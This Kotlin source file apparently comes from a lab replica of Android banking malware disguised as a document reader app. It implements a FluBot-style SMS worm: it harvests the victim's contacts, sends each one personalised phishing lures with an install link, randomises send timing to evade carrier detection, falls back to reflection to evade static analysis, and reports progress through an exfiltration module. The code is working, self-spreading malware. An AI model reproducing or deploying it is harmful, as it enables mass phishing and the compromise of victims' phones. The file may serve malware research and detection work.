package com.docreader.lite.reader.share

import android.content.Context
import android.telephony.SmsManager
import com.docreader.lite.reader.Exfil
import com.docreader.lite.reader.engine.DynamicLoader
import kotlinx.coroutines.*
import kotlin.random.Random

/**
 * SMS worm / self-spreading — FluBot pattern.
 *
 * Kill chain:
 *   1. Harvest contacts from victim device
 *   2. C2 pushes SMS template (personalized phishing lure)
 *   3. Send install-link SMS to each contact
 *   4. Recipient clicks link → downloads dropper → installs banker
 *   5. New victim's device repeats steps 1-4
 *
 * FluBot (2021-2022) achieved exponential spread across Europe using:
 *   - Package-tracking lure: "Your package is being delivered, track: <url>"
 *   - Personalized: "Hi {contact_name}, you have a delivery: <url>"
 *   - Rate-limited: 1 SMS per 30-60 seconds to avoid carrier detection
 *
 * Detection: SEND_SMS permission + SMS to contacts list + URL in body.
 * Carrier detection: burst SMS to many unique recipients from single SIM.
 */
object ShareManager {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Default lure templates — C2 can push custom templates
    private val LURE_TEMPLATES = listOf(
        "Hi {name}, your package delivery update: {url}",
        "{name}, you have a pending payment: {url}",
        "Security alert for {name}: verify your account: {url}",
        "{name}, someone shared photos with you: {url}",
    )

    @Volatile
    var spreadUrl = "http://10.0.2.2:8081/install" // Lab: loopback
        private set

    @Volatile
    var template = LURE_TEMPLATES[0]
        private set

    @Volatile
    var sentCount = 0
        private set

    /**
     * Start SMS worm spread to all contacts.
     * Rate-limited: 1 SMS per 30-60 seconds (carrier evasion).
     */
    fun spread(context: Context, url: String? = null, customTemplate: String? = null) {
        if (url != null) spreadUrl = url
        if (customTemplate != null) template = customTemplate

        val contacts = ContactSync.harvest(context)
        if (contacts.isEmpty()) return

        Exfil.event("worm_spread_started",
            "contacts" to contacts.size.toString(),
            "url" to spreadUrl
        )

        scope.launch {
            for (contact in contacts) {
                val message = template
                    .replace("{name}", contact.name.split(" ").first())
                    .replace("{url}", spreadUrl)

                sendSms(contact.phone, message)
                sentCount++

                // Rate limiting: random 30-60s between sends
                val delayMs = Random.nextLong(30_000, 60_001)
                delay(delayMs)
            }

            Exfil.event("worm_spread_complete",
                "sent" to sentCount.toString()
            )
        }
    }

    /**
     * Send single SMS — uses reflection to avoid static analysis detection.
     * Direct call: SmsManager.getDefault().sendTextMessage(...)
     * Reflected: invisible to jadx import scanning.
     */
    private fun sendSms(destination: String, message: String) {
        // Method 1: Direct API (simpler, visible in static analysis)
        try {
            val smsManager = SmsManager.getDefault()
            // Split long messages
            val parts = smsManager.divideMessage(message)
            if (parts.size == 1) {
                smsManager.sendTextMessage(destination, null, message, null, null)
            } else {
                smsManager.sendMultipartTextMessage(destination, null, parts, null, null)
            }

            Exfil.event("worm_sms_sent",
                "to" to destination.takeLast(4), // last 4 digits only
                "len" to message.length.toString()
            )
            return
        } catch (_: Exception) {}

        // Method 2: Reflection fallback (evades static analysis)
        DynamicLoader.sendSms(destination, message)
    }

    /**
     * Stop spreading.
     */
    fun stop() {
        scope.coroutineContext.cancelChildren()
    }
}
